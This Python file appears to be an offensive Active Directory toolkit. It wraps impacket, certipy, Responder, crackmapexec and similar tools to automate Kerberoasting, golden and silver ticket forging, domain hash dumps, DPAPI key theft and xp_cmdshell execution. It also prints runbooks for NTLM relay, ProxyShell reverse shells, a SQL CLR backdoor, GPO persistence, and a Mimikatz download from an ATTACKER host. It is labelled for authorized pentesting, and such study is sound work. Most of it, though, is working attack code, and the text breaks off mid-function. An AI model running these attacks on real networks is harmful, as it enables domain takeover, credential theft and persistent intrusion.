#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                    RED OFFENSIVE TEAM 05 - SWISS ARMY KNIFE                    ║
║                         Ultimate AD Pentesting Toolkit                         ║
╚═══════════════════════════════════════════════════════════════════════════════╝

Complete Enterprise Attack Suite:
  • AD/Kerberos Attacks (Kerberoasting, AS-REP, Golden/Silver Tickets)
  • AD CS (ESC1-ESC8 Certificate Attacks)
  • Exchange Server (PrivExchange, ProxyLogon, ProxyShell, EWS)
  • SQL Server (Linked Servers, CLR, xp_cmdshell)
  • GPO Lateral Movement & Persistence
  • DPAPI Backup Key & Secret Extraction
  • BloodHound Integration
  • LLMNR/NBT-NS Poisoning (Responder)
  • SMB Relay & mitm6
  • CVE Scanner & Exploit Suggester

Intended for AUTHORIZED penetration testing and CTF use only.
"""

import argparse
import cmd
import os
import sys
import subprocess
import shutil
import datetime
import json
import socket
import re
import threading
import signal
from pathlib import Path
from getpass import getpass
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
from enum import Enum

# ──────────────────────────────────────────────────────────────────────────────
# COLORS & UI
# ──────────────────────────────────────────────────────────────────────────────

try:
    from colorama import Fore, Style, init as colorama_init
    colorama_init(autoreset=True)
    R   = Fore.RED
    G   = Fore.GREEN
    Y   = Fore.YELLOW
    B   = Fore.CYAN
    M   = Fore.MAGENTA
    W   = Fore.WHITE
    RST = Style.RESET_ALL
except ImportError:
    R = G = Y = B = M = W = RST = ""

def banner():
    print(f"""{R}
╔═══════════════════════════════════════════════════════════════════════════════╗
║{W}                    RED OFFENSIVE TEAM 05 - SWISS ARMY KNIFE                    {R}║
║{B}                         Ultimate AD Pentesting Toolkit                         {R}║
╚═══════════════════════════════════════════════════════════════════════════════╝{RST}
""")

def info(msg):    print(f"{G}[+]{RST} {msg}")
def warn(msg):    print(f"{Y}[!]{RST} {msg}")
def err(msg):     print(f"{R}[-]{RST} {msg}")
def step(msg):    print(f"{B}[*]{RST} {msg}")
def success(msg): print(f"{G}[✓]{RST} {msg}")
def debug(msg):   print(f"{M}[D]{RST} {msg}")
def title(msg):   print(f"\n{Y}{'='*60}{RST}\n{B}{msg}{RST}\n{Y}{'='*60}{RST}")

# ──────────────────────────────────────────────────────────────────────────────
# CONFIGURATION
# ──────────────────────────────────────────────────────────────────────────────

@dataclass
class TargetConfig:
    ip: str              = ""
    domain: str          = ""
    username: str        = ""
    password: str        = ""
    ntlm_hash: str       = ""
    ca_server: str       = ""
    exchange_server: str = ""
    sql_server: str      = ""
    output_dir: Path     = Path("rot05_output")
    interface: str       = "eth0"
    userlist: Path       = Path("userlist.txt")
    passlist: Path       = Path("passlist.txt")

    def has_creds(self) -> bool:
        return bool(self.username and (self.password or self.ntlm_hash))

    def cred_string(self) -> str:
        if self.ntlm_hash:
            return f"{self.domain}/{self.username}@{self.ip} -hashes :{self.ntlm_hash}"
        return f"{self.domain}/{self.username}:{self.password}@{self.ip}"

config = TargetConfig()

# ──────────────────────────────────────────────────────────────────────────────
# UTILITIES
# ──────────────────────────────────────────────────────────────────────────────

def ensure_dir(path: Path) -> Path:
    path.mkdir(parents=True, exist_ok=True)
    return path

def tool_exists(name: str) -> bool:
    return shutil.which(name) is not None

# FIX #6 – guard stdout/stderr when capture=False (they are None, not "")
def run_cmd(cmd: str, timeout: int = 120, capture: bool = True) -> Tuple[int, str, str]:
    """Run command and return (returncode, stdout, stderr)."""
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=capture, text=True, timeout=timeout
        )
        stdout = result.stdout or ""
        stderr = result.stderr or ""
        return result.returncode, stdout, stderr
    except subprocess.TimeoutExpired:
        return -1, "", f"Timeout after {timeout}s"
    except Exception as e:
        return -1, "", str(e)

def save_output(content: str, filename: Path):
    filename.parent.mkdir(parents=True, exist_ok=True)
    filename.write_text(content)
    info(f"Saved to {filename}")

def load_output(filename: Path) -> str:
    if filename.exists():
        return filename.read_text()
    return ""

def is_port_open(ip: str, port: int) -> bool:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except Exception:
        return False

# FIX #10 – tighter Exchange detection (requires OWA response, not just open ports)
def detect_services(ip: str) -> Dict[str, bool]:
    services = {}
    port_map = {
        "DC":     [88, 389, 445],
        "SQL":    [1433, 1434],
        "RDP":    [3389],
        "WinRM":  [5985, 5986],
    }
    for service, ports in port_map.items():
        services[service] = any(is_port_open(ip, p) for p in ports)

    # Exchange: require 443 AND a valid OWA response header
    if is_port_open(ip, 443):
        _, out, _ = run_cmd(f"curl -k -s -I https://{ip}/owa/ --max-time 5")
        services["Exchange"] = "X-OWA-Version" in out or "X-FEServer" in out
    else:
        services["Exchange"] = False

    return services

# ──────────────────────────────────────────────────────────────────────────────
# MODULE: AD ENUMERATION
# ──────────────────────────────────────────────────────────────────────────────

class ADEnum:
    @staticmethod
    def run_nmap(target_ip: str) -> Dict:
        title("NMAP Full Port Scan")
        out_dir = ensure_dir(config.output_dir / "nmap")

        step(f"Scanning {target_ip} for open ports...")
        # FIX #3 – remove shell '>' redirect; capture and save via save_output()
        _, stdout, stderr = run_cmd(
            f"nmap -Pn -p- {target_ip} --min-rate 1000 -oA {out_dir}/quick_ports",
            timeout=300
        )
        save_output(stdout + stderr, out_dir / "quick_ports.log")

        step("Service detection on open ports...")
        _, stdout, stderr = run_cmd(
            f"nmap -Pn -sV -sC "
            f"-p $(nmap -Pn -p- {target_ip} --min-rate 1000 | grep '^[0-9]' | cut -d'/' -f1 | tr '\\n' ',') "
            f"{target_ip} -oA {out_dir}/services",
            timeout=600
        )
        save_output(stdout + stderr, out_dir / "services.log")

        return {"output": out_dir}

    @staticmethod
    def ldap_enum():
        title("LDAP Enumeration")
        out_dir = ensure_dir(config.output_dir / "ldap")

        if not config.domain:
            warn("Domain name required")
            return

        base_dn = "dc=" + config.domain.replace(".", ",dc=")

        step("Anonymous LDAP dump...")
        # FIX #3 – capture and save, no shell redirect
        _, stdout, stderr = run_cmd(
            f"ldapsearch -x -b '{base_dn}' -H ldap://{config.ip}"
        )
        save_output(stdout + stderr, out_dir / "anon_dump.txt")

        if config.has_creds():
            step("Authenticated LDAP dump...")
            _, stdout, stderr = run_cmd(
                f"ldapsearch -x -D '{config.username}@{config.domain}' "
                f"-w '{config.password}' -b '{base_dn}' -H ldap://{config.ip}"
            )
            save_output(stdout + stderr, out_dir / "auth_dump.txt")

            users = "\n".join(
                line.split()[1] for line in stdout.splitlines()
                if line.lower().startswith("samaccountname:")
            )
            save_output(users, out_dir / "users.txt")
            info(f"Extracted users to {out_dir}/users.txt")

        return out_dir

    @staticmethod
    def smb_enum():
        title("SMB Enumeration")
        out_dir = ensure_dir(config.output_dir / "smb")

        step("Enumerating SMB shares...")
        _, stdout, stderr = run_cmd(f"smbmap -H {config.ip}")
        save_output(stdout + stderr, out_dir / "smbmap.txt")

        step("Checking SMB signing...")
        _, stdout, stderr = run_cmd(
            f"nmap --script smb2-security-mode.nse -p 445 {config.ip}"
        )
        save_output(stdout + stderr, out_dir / "smb_signing.txt")

        if config.has_creds():
            step("Authenticated SMB shares...")
            _, stdout, stderr = run_cmd(
                f"smbclient -L {config.ip} -U '{config.username}%{config.password}'"
            )
            save_output(stdout + stderr, out_dir / "auth_shares.txt")

        return out_dir

# ──────────────────────────────────────────────────────────────────────────────
# MODULE: KERBEROS ATTACKS
# ──────────────────────────────────────────────────────────────────────────────

class KerberosAttacks:
    @staticmethod
    def kerberoast():
        title("Kerberoasting")
        out_file = config.output_dir / "kerberoast" / "hashes.txt"
        ensure_dir(out_file.parent)

        if not config.has_creds():
            err("Credentials required for Kerberoasting")
            return

        step("Requesting SPN hashes...")
        cmd = (
            f"impacket-GetUserSPNs "
            f"'{config.domain}/{config.username}:{config.password}' "
            f"-dc-ip {config.ip} -request"
        )
        _, stdout, stderr = run_cmd(cmd)

        if "krb5tgs" in stdout:
            save_output(stdout, out_file)
            success(f"Kerberoastable hashes saved to {out_file}")
            info("Crack with: hashcat -m 13100 hashes.txt rockyou.txt")
        else:
            warn("No Kerberoastable accounts found")

    @staticmethod
    def asreproast():
        title("AS-REP Roasting")
        out_file = config.output_dir / "asrep" / "hashes.txt"
        ensure_dir(out_file.parent)

        users_file = config.output_dir / "ldap" / "users.txt"
        if users_file.exists() and users_file.stat().st_size > 0:
            step(f"Using userlist from {users_file}")
            cmd = (
                f"impacket-GetNPUsers '{config.domain}/' "
                f"-usersfile {users_file} -dc-ip {config.ip} -request -format john"
            )
        else:
            step("No userlist found, trying anonymous roast")
            cmd = (
                f"impacket-GetNPUsers '{config.domain}/' "
                f"-dc-ip {config.ip} -request -format john"
            )

        _, stdout, _ = run_cmd(cmd)
        if "$krb5asrep" in stdout:
            save_output(stdout, out_file)
            success(f"AS-REP hashes saved to {out_file}")
            info("Crack with: hashcat -m 18200 hashes.txt rockyou.txt")

    @staticmethod
    def golden_ticket():
        title("Golden Ticket Creation")
        out_dir = ensure_dir(config.output_dir / "tickets")

        step("Extracting domain SID...")
        _, stdout, _ = run_cmd(
            f"impacket-lookupsid "
            f"'{config.domain}/{config.username}:{config.password}@{config.ip}'"
        )

        sid_match = re.search(r"S-1-5-21-\d+-\d+-\d+", stdout)
        if not sid_match:
            err("Could not extract domain SID")
            return

        domain_sid = sid_match.group(0)
        success(f"Domain SID: {domain_sid}")

        if not config.ntlm_hash:
            step("Extracting KRBTGT hash from DC...")
            _, stdout, _ = run_cmd(
                f"impacket-secretsdump "
                f"'{config.domain}/{config.username}:{config.password}@{config.ip}' "
                f"-just-dc-user krbtgt"
            )
            hash_match = re.search(
                r"krbtgt:\d+:[a-f0-9]{32}:([a-f0-9]{32})", stdout, re.IGNORECASE
            )
            if hash_match:
                config.ntlm_hash = hash_match.group(1)

        if config.ntlm_hash:
            step("Creating golden ticket...")
            out_file = out_dir / "golden_ticket.ccache"
            _, stdout, stderr = run_cmd(
                f"impacket-ticketer "
                f"-domain {config.domain} "
                f"-domain-sid {domain_sid} "
                f"-nthash {config.ntlm_hash} "
                f"-user-id 500 Administrator"
            )
            save_output(stdout + stderr, out_dir / "golden_ticket.log")

            success(f"Golden ticket log saved to {out_dir}/golden_ticket.log")
            print(f"""
{Y}Usage:{RST}
  Linux: export KRB5CCNAME={out_file}
         impacket-psexec -k {config.domain}/Administrator@{config.ip}

  Windows (mimikatz): kerberos::ptt {out_file}
""")

    @staticmethod
    # FIX #4 – use -nthash, not -aesKey, for NTLM hashes
    def silver_ticket(spn: str):
        title(f"Silver Ticket Creation - {spn}")
        out_dir = ensure_dir(config.output_dir / "tickets")

        _, stdout, _ = run_cmd(
            f"impacket-lookupsid "
            f"'{config.domain}/{config.username}:{config.password}@{config.ip}'"
        )
        sid_match = re.search(r"S-1-5-21-\d+-\d+-\d+", stdout)
        if not sid_match:
            err("Could not extract domain SID")
            return

        domain_sid = sid_match.group(0)
        target_host = spn.split("/")[1] if "/" in spn else spn

        _, stdout, _ = run_cmd(
            f"impacket-secretsdump "
            f"'{config.domain}/{config.username}:{config.password}@{config.ip}' "
            f"-just-dc-user {target_host}$"
        )

        hash_match = re.search(
            rf"{re.escape(target_host)}\$:\d+:[a-f0-9]{{32}}:([a-f0-9]{{32}})",
            stdout, re.IGNORECASE
        )
        if hash_match:
            ntlm_hash = hash_match.group(1)
            out_file = out_dir / f"silver_{target_host}.ccache"
            _, stdout, stderr = run_cmd(
                f"impacket-ticketer "
                f"-domain {config.domain} "
                f"-domain-sid {domain_sid} "
                f"-spn {spn} "
                f"-nthash {ntlm_hash} "
                f"Administrator"
            )
            save_output(stdout + stderr, out_dir / f"silver_{target_host}.log")
            success(f"Silver ticket log saved to {out_dir}/silver_{target_host}.log")

# ──────────────────────────────────────────────────────────────────────────────
# MODULE: AD CS ATTACKS
# ──────────────────────────────────────────────────────────────────────────────

class ADCSAttacks:
    @staticmethod
    def enumerate_ca():
        title("Certificate Authority Enumeration")
        out_dir = ensure_dir(config.output_dir / "adcs")

        if not config.has_creds():
            err("Credentials required for AD CS enumeration")
            return

        step("Finding Certificate Authorities...")
        _, stdout, stderr = run_cmd(
            f"certipy find "
            f"-u '{config.username}@{config.domain}' "
            f"-p '{config.password}' "
            f"-dc-ip {config.ip} -stdout"
        )
        save_output(stdout + stderr, out_dir / "ca_discovery.txt")

        if "VULNERABLE" in stdout:
            success("Vulnerable templates found!")
            for line in stdout.split("\n"):
                if "Template Name" in line or "ESC" in line:
                    print(f"  {Y}{line.strip()}{RST}")

        return out_dir

    @staticmethod
    def esc1_attack(template: str, ca_name: str, target_user: str = "Administrator"):
        title(f"ESC1 Attack - Template: {template}")
        out_dir = ensure_dir(config.output_dir / "adcs" / "esc1")

        step(f"Requesting certificate for {target_user}...")
        _, stdout, stderr = run_cmd(
            f"certipy req "
            f"-u '{config.username}@{config.domain}' "
            f"-p '{config.password}' "
            f"-ca {ca_name} -template {template} "
            f"-alt {target_user} -dc-ip {config.ip}"
        )
        save_output(stdout + stderr, out_dir / "cert_request.txt")

        pfx_files = list(Path(".").glob("*.pfx"))
        if pfx_files:
            pfx_file = pfx_files[0]
            step("Authenticating with certificate...")
            _, stdout, stderr = run_cmd(
                f"certipy auth -pfx {pfx_file} -dc-ip {config.ip}"
            )
            save_output(stdout + stderr, out_dir / "auth_result.txt")

            if "NT HASH" in stdout:
                hash_match = re.search(
                    r"NT HASH:\s*([a-f0-9]{32})", stdout, re.IGNORECASE
                )
                if hash_match:
                    success(f"Administrator NTLM hash: {hash_match.group(1)}")

    @staticmethod
    def esc8_relay():
        title("ESC8 - NTLM Relay to ADCS Web Enrollment")
        print(f"""
{Y}ESC8 Attack Setup:{RST}

  Terminal 1 (Responder - disable SMB/HTTP):
    sudo sed -i 's/SMB = On/SMB = Off/' /etc/responder/Responder.conf
    sudo sed -i 's/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf
    sudo responder -I {config.interface} -rdwv

  Terminal 2 (NTLM Relay to ADCS):
    sudo impacket-ntlmrelayx -t http://{config.ca_server}/certsrv/certfnsh.asp -smb2support --adcs

  Force authentication from target:
    impacket-smbexec {config.domain}/{config.username}:{config.password}@{config.ip}
    Enter: net use \\\\{config.ip}\\share
""")

# ──────────────────────────────────────────────────────────────────────────────
# MODULE: EXCHANGE ATTACKS
# ──────────────────────────────────────────────────────────────────────────────

class ExchangeAttacks:
    @staticmethod
    def detect_version():
        title("Exchange Version Detection")
        out_dir = ensure_dir(config.output_dir / "exchange")

        host = config.exchange_server or config.ip

        step(f"Checking {host} for Exchange...")
        _, stdout, stderr = run_cmd(
            f"curl -k -s -I https://{host}/owa/ --max-time 10"
        )
        save_output(stdout + stderr, out_dir / "version.txt")

        content = stdout + stderr
        if "15.0" in content:
            warn("Exchange 2013 detected")
        elif "15.1" in content:
            warn("Exchange 2016 detected")
        elif "15.2" in content:
            warn("Exchange 2019 detected")

    @staticmethod
    def privesc():
        title("PrivExchange Attack (CVE-2019-1040)")

        if not config.has_creds():
            err("Credentials required for PrivExchange")
            return

        host = config.exchange_server or config.ip
        attacker_ip = input("Enter attacker IP for relay listener: ").strip()

        print(f"""
{Y}PrivExchange Attack Steps:{RST}

  1. Start NTLM relay listener:
     sudo impacket-ntlmrelayx -t ldap://{config.ip} -escalate-user

  2. Execute attack:
     python3 privexchange.py -ah {attacker_ip} -u {config.username} \\
       -d {config.domain} -p '{config.password}' {host}

  3. After relay, request DA ticket:
     impacket-getST -spn 'cifs/dc.{config.domain}' \\
       -impersonate administrator '{config.domain}/{config.username}:{config.password}'
""")

    @staticmethod
    def proxylogon():
        title("ProxyLogon Attack (CVE-2021-26855)")

        host = config.exchange_server or config.ip

        print(f"""
{Y}ProxyLogon Exploitation:{RST}

  Detection:
    python3 CVE-2021-26855_Detect.py -u https://{host}

  Exploitation (ProxyShell chain):
    python3 proxyshell.py -t https://{host} -u {config.username} \\
      -p '{config.password}' -c "whoami"

  Remote shell:
    python3 proxyshell.py -t https://{host} \\
      -c "powershell.exe -enc <base64_revshell>"
""")

    @staticmethod
    def ews_abuse():
        title("Exchange Web Services (EWS) Abuse")
        out_dir = ensure_dir(config.output_dir / "exchange" / "ews")

        if not config.has_creds():
            err("Credentials required for EWS access")
            return

        host = config.exchange_server or config.ip

        print(f"""
{Y}EWS Python Script:{RST}

  from exchangelib import DELEGATE, Account, Credentials, Configuration
  creds = Credentials(username='{config.username}@{config.domain}', password='{config.password}')
  cfg   = Configuration(service_endpoint='https://{host}/ews/Exchange.asmx')
  account = Account('{config.username}@{config.domain}', credentials=creds,
                    autodiscover=False, config=cfg)

  # List emails
  for item in account.inbox.all().only('subject', 'sender', 'datetime_received')[:100]:
      print(f"{{item.sender}}: {{item.subject}}")

  # Search for passwords
  for item in account.inbox.filter(subject__contains='password'):
      print(item.subject)
""")

# ──────────────────────────────────────────────────────────────────────────────
# MODULE: SQL SERVER ATTACKS
# ──────────────────────────────────────────────────────────────────────────────

class SQLAttacks:
    @staticmethod
    def enumerate():
        title("SQL Server Enumeration")
        out_dir = ensure_dir(config.output_dir / "sql" / "enum")

        host = config.sql_server or config.ip

        if not is_port_open(host, 1433):
            warn(f"SQL Server not detected on {host}:1433")
            return

        step(f"Enumerating SQL Server on {host}...")

        if config.has_creds():
            for label, query in [
                ("version",        "SELECT @@VERSION, SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin')"),
                ("linked_servers", "SELECT * FROM sys.servers WHERE is_linked = 1"),
                ("xp_cmdshell",    "EXEC sp_configure 'xp_cmdshell'"),
            ]:
                _, stdout, stderr = run_cmd(
                    f"sqsh -S {host} -U {config.username} -P '{config.password}' -Q \"{query}\""
                )
                save_output(stdout + stderr, out_dir / f"{label}.txt")

        return out_dir

    @staticmethod
    def xp_cmdshell(command: str):
        title("xp_cmdshell Command Execution")

        if not config.has_creds():
            err("Credentials required for SQL access")
            return

        host = config.sql_server or config.ip
        step(f"Executing: {command}")

        _, _, _ = run_cmd(
            f"sqsh -S {host} -U {config.username} -P '{config.password}' -Q \""
            f"EXEC sp_configure 'show advanced options', 1; RECONFIGURE; "
            f"EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;\""
        )

        _, stdout, stderr = run_cmd(
            f"sqsh -S {host} -U {config.username} -P '{config.password}' "
            f"-Q \"EXEC xp_cmdshell '{command}'\""
        )
        print(stdout)
        save_output(stdout + stderr, config.output_dir / "sql" / "cmd_output.txt")

    @staticmethod
    def linked_server_pivot(linked_server: str):
        title(f"Pivoting via Linked Server: {linked_server}")
        out_dir = ensure_dir(config.output_dir / "sql" / "pivot")

        host = config.sql_server or config.ip

        query = f"SELECT * FROM OPENQUERY([{linked_server}], 'SELECT @@SERVERNAME, SYSTEM_USER')"
        _, stdout, stderr = run_cmd(
            f"sqsh -S {host} -U {config.username} -P '{config.password}' -Q \"{query}\""
        )
        save_output(stdout + stderr, out_dir / f"{linked_server}_info.txt")

        rpc_cmd = f"EXEC sp_serveroption '{linked_server}', 'rpc out', 'true'"
        run_cmd(
            f"sqsh -S {host} -U {config.username} -P '{config.password}' -Q \"{rpc_cmd}\""
        )

        info(f"Now you can execute commands on {linked_server} with:")
        print(f"  EXECUTE ('EXEC xp_cmdshell ''whoami''') AT [{linked_server}]")

    @staticmethod
    def clr_backdoor():
        title("CLR Assembly Backdoor Deployment")

        print(f"""
{Y}CLR Backdoor Setup:{RST}

  1. Create malicious C# DLL:

     using System;
     using System.Data.SqlTypes;
     using Microsoft.SqlServer.Server;
     using System.Diagnostics;

     public class StoredProcedures
     {{
         [SqlProcedure]
         public static void cmdExec(SqlString command)
         {{
             Process.Start("cmd.exe", "/c " + command.Value);
         }}
     }}

  2. Compile:
     csc /target:library /reference:System.Data.dll backdoor.cs

  3. Deploy:
     CREATE ASSEMBLY Backdoor FROM '\\\\ATTACKER\\share\\backdoor.dll' WITH PERMISSION_SET = UNSAFE
     CREATE PROCEDURE exec_cmd @cmd NVARCHAR(4000) AS EXTERNAL NAME Backdoor.StoredProcedures.cmdExec

  4. Execute:
     EXEC exec_cmd 'whoami > C:\\Temp\\out.txt'
""")

# ──────────────────────────────────────────────────────────────────────────────
# MODULE: GPO & PERSISTENCE
# ──────────────────────────────────────────────────────────────────────────────

class GPOAttacks:
    @staticmethod
    def find_cpassword():
        title("Searching for cPassword in SYSVOL")
        out_file = config.output_dir / "gpo" / "cpassword_results.txt"
        ensure_dir(out_file.parent)

        if not config.has_creds():
            err("Credentials required for SYSVOL access")
            return

        step("Connecting to SYSVOL share...")
        _, stdout, stderr = run_cmd(
            f"smbclient //{config.ip}/SYSVOL "
            f"-U '{config.domain}\\\\{config.username}%{config.password}' "
            f"-c 'mask *Groups.xml; recurse; ls'"
        )
        save_output(stdout + stderr, out_file)

        if "cpassword" in (stdout + stderr).lower():
            success("Found cPassword entries!")
            for line in (stdout + stderr).split("\n"):
                if "cpassword" in line.lower():
                    print(f"  {Y}{line}{RST}")
            print(f"\n{G}Decrypt with:{RST}\n  gpp-decrypt <cpassword_hash>")
        else:
            warn("No cPassword entries found")

    @staticmethod
    def malicious_gpo():
        title("Malicious GPO Deployment")
        dc = config.domain.replace(".", ",DC=")

        print(f"""
{Y}Malicious GPO Attack Vectors:{RST}

  1. Scheduled task reverse shell:
     $action  = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -NonI -W Hidden -Enc <base64>"
     $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5)
     Register-ScheduledTask -TaskName "SystemHealth" -Action $action -Trigger $trigger -User "SYSTEM"

  2. Startup script via SYSVOL:
     Set-GPPrefRegistryValue -Name "StartupBackdoor" \\
       -Key "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" \\
       -Value "Update" -Type String \\
       -Data "\\\\{config.ip}\\SYSVOL\\{config.domain}\\scripts\\payload.bat"

  3. Force GPO update:
     crackmapexec smb {config.ip} -u {config.username} -p '{config.password}' -x 'gpupdate /force'
""")

# ──────────────────────────────────────────────────────────────────────────────
# MODULE: CREDENTIAL ACCESS
# ──────────────────────────────────────────────────────────────────────────────

class CredentialAccess:
    @staticmethod
    def secretsdump(target_user: str = ""):
        title("Domain Secrets Dump")
        out_dir = ensure_dir(config.output_dir / "secrets")

        if not config.has_creds():
            err("Credentials required")
            return

        if target_user:
            step(f"Dumping hash for {target_user}...")
            cmd = (
                f"impacket-secretsdump "
                f"'{config.domain}/{config.username}:{config.password}@{config.ip}' "
                f"-just-dc-user {target_user}"
            )
        else:
            step("Dumping all domain hashes...")
            cmd = (
                f"impacket-secretsdump "
                f"'{config.domain}/{config.username}:{config.password}@{config.ip}' "
                f"-just-dc-ntlm"
            )

        _, stdout, stderr = run_cmd(cmd)
        out_file = out_dir / f"hashes_{target_user if target_user else 'all'}.txt"
        save_output(stdout + stderr, out_file)

        for line in stdout.split("\n"):
            if "krbtgt" in line.lower():
                success(f"KRBTGT hash found: {line}")

    @staticmethod
    def dpapi_backup():
        title("DPAPI Backup Key Extraction")
        out_dir = ensure_dir(config.output_dir / "dpapi")

        if not config.has_creds():
            err("Credentials required")
            return

        step("Extracting Domain DPAPI Backup Key...")
        _, stdout, stderr = run_cmd(
            f"impacket-secretsdump "
            f"'{config.domain}/{config.username}:{config.password}@{config.ip}' "
            f"-backup-key"
        )
        save_output(stdout + stderr, out_dir / "backup_key.txt")

        print(f"""
{Y}DPAPI Decryption with Backup Key:{RST}

  dpapi.py masterkey /path/to/user/masterkey \\
    -domain {config.domain} -sid <user_sid> -backupkey <BACKUP_KEY>

  dpapi.py blob -file <blob_file> -masterkey <MASTER_KEY>

  Common DPAPI locations:
    • Chrome: %LocalAppData%\\Google\\Chrome\\User Data\\Local State
    • RDP:    %AppData%\\Microsoft\\Credentials\\
    • Vault:  %AppData%\\Microsoft\\Vault\\
""")

    @staticmethod
    def mimikatz_remote():
        title("Remote Mimikatz via WinRM")

        if not config.has_creds():
            err("Credentials required")
            return

        print(f"""
{Y}Remote Credential Harvesting:{RST}

  # Via CrackMapExec module:
    crackmapexec smb {config.ip} -u {config.username} -p '{config.password}' -M mimikatz

  # Via WinRM:
    crackmapexec winrm {config.ip} -u {config.username} -p '{config.password}' \\
      -x 'powershell -ep bypass IEX(New-Object Net.WebClient).DownloadString("http://ATTACKER/Invoke-Mimikatz.ps1"); Invoke-Mimikatz'

  # Dump LSASS remotely:
    crackmapexec smb {config.ip} -u {config.username} -p '{config.password}' -M lsassy
""")

# ──────────────────────────────────────────────────────────────────────────────
# MODULE: LLMNR & RELAY
# ──────────────────────────────────────────────────────────────────────────────

class RelayAttacks:
    @staticmethod
    # FIX #7 – removed .join() so Responder runs as a true background thread
    def responder(duration: int = 60):
        title(f"Responder (LLMNR/NBT-NS Poisoning) - {duration}s")
        out_dir = ensure_dir(config.output_dir / "responder")
        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        out_file = out_dir / f"hashes_{ts}.txt"

        def _run():
            _, stdout, stderr = run_cmd(
                f"sudo timeout {duration} responder -I {config.interface} -rdwv",
                timeout=duration + 10
            )
            save_output(stdout + stderr, out_file)

        t = threading.Thread(target=_run, daemon=True)
        t.start()

        info(f"Responder started in background on {config.interface} ({duration}s)")
        info(f"Hashes will be saved to {out_file}")
        info("Crack NTLMv2 hashes with: hashcat -m 5600 <hashes_file> rockyou.txt")

    @staticmethod
    def smb_relay(targets_file: str):
        title("SMB Relay Attack")

        if not Path(targets_file).exists():
            err(f"Targets file not found: {targets_file}")
            print(f"Create {targets_file} with IPs that have SMB signing disabled")
            return

        print(f"""
{Y}SMB Relay Attack Setup:{RST}

  Target list: {targets_file}

  Terminal 1 (Responder - disable SMB/HTTP):
    sudo sed -i 's/SMB = On/SMB = Off/' /etc/responder/Responder.conf
    sudo sed -i 's/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf
    sudo responder -I {config.interface} -rdwv

  Terminal 2 (NTLM Relay):
    sudo impacket-ntlmrelayx -tf {targets_file} -smb2support -i

  Interactive shell mode:
    sudo impacket-ntlmrelayx -tf {targets_file} -smb2support -i -socks

  IPv6 mitm6 relay:
    sudo mitm6 -d {config.domain}
    sudo impacket-ntlmrelayx -6 -t ldaps://{config.ip} -wh fakewpad.{config.domain}
""")

    @staticmethod
    def mitm6_attack():
        title("mitm6 IPv6 Attack")

        print(f"""
{Y}mitm6 Attack (IPv6 DNS Spoofing):{RST}

  Terminal 1:
    sudo mitm6 -d {config.domain}

  Terminal 2:
    sudo impacket-ntlmrelayx -6 -t ldaps://{config.ip} \\
      -wh fakewpad.{config.domain} -l {config.output_dir}/mitm6_loot

  Expected outcome:
    • Relay to LDAP for ACL modification
    • Add user to Domain Admins
    • Dump domain database
""")

# ──────────────────────────────────────────────────────────────────────────────
# MODULE: BLOODHOUND
# ──────────────────────────────────────────────────────────────────────────────

class BloodHound:
    @staticmethod
    def collect(sharphound_path: str = ""):
        title("BloodHound Data Collection")
        out_dir = ensure_dir(config.output_dir / "bloodhound")

        if sharphound_path and Path(sharphound_path).exists():
            step(f"Uploading SharpHound to {config.ip}...")
            run_cmd(
                f"crackmapexec smb {config.ip} "
                f"-u '{config.username}' -p '{config.password}' "
                f"--put-file {sharphound_path} Windows/Temp/SharpHound.exe"
            )

            step("Executing SharpHound...")
            run_cmd(
                f"crackmapexec winrm {config.ip} "
                f"-u '{config.username}' -p '{config.password}' "
                f"-X 'Windows\\Temp\\SharpHound.exe -c All --outputdirectory Windows\\Temp\\BH'"
            )

            step("Downloading results...")
            run_cmd(
                f"crackmapexec smb {config.ip} "
                f"-u '{config.username}' -p '{config.password}' "
                f"--get-file Windows\\Temp\\BH/*.zip {out_dir}/"
            )
            success(f"BloodHound data saved to {out_dir}")
        else:
            print(f"""
{Y}Manual SharpHound Collection:{RST}

  # Upload SharpHound.exe:
    crackmapexec smb {config.ip} -u '{config.username}' -p '{config.password}' \\
      --put-file SharpHound.exe Windows/Temp/

  # Execute remotely via WinRM:
    crackmapexec winrm {config.ip} -u '{config.username}' -p '{config.password}' \\
      -X 'Windows\\Temp\\SharpHound.exe -c All'

  # Download results:
    crackmapexec smb {config.ip} -u '{config.username}' -p '{config.password}' \\
      --get-file Windows\\Temp\\*.zip {out_dir}/

  # Analyse:
    neo4j console
    bloodhound --no-sandbox
""")

# ──────────────────────────────────────────────────────────────────────────────
# MODULE: CVE SCANNER
# ──────────────────────────────────────────────────────────────────────────────

class CVEScanner:
    VULNERABILITIES = {
        "CVE-2020-1472": {"name": "Zerologon",       "port": 445, "check": "nmap --script smb-vuln-cve-2020-1472 -p 445 {ip}"},
        "CVE-2021-26855": {"name": "ProxyLogon",      "port": 443, "check": "curl -k -s -I https://{ip}/owa/ --max-time 5"},
        "CVE-2021-34473": {"name": "ProxyShell",      "port": 443, "check": "curl -k -s -X OPTIONS https://{ip}/autodiscover/ --max-time 5"},
        "CVE-2019-1040":  {"name": "PrivExchange",    "port": 443, "check": "nmap -p 443 --script http-ntlm-info {ip}"},
        "CVE-2020-0618":  {"name": "SQL Server RCE",  "port": 1433, "check": "nmap -p 1433 --script ms-sql-info {ip}"},
        "MS17-010":       {"name": "EternalBlue",     "port": 445, "check": "nmap --script smb-vuln-ms17-010 -p 445 {ip}"},
    }

    @staticmethod
    def scan():
        title("CVE Scanner - Exploit Suggester")
        out_dir = ensure_dir(config.output_dir / "cves")

        results = []

        # FIX #1 – renamed loop variable from 'info' (shadows global) to 'vuln'
        for cve_id, vuln in CVEScanner.VULNERABILITIES.items():
            port = vuln["port"]
            if is_port_open(config.ip, port):
                step(f"Checking {cve_id} ({vuln['name']}) on port {port}...")
                cmd = vuln["check"].replace("{ip}", config.ip)
                _, stdout, stderr = run_cmd(cmd)

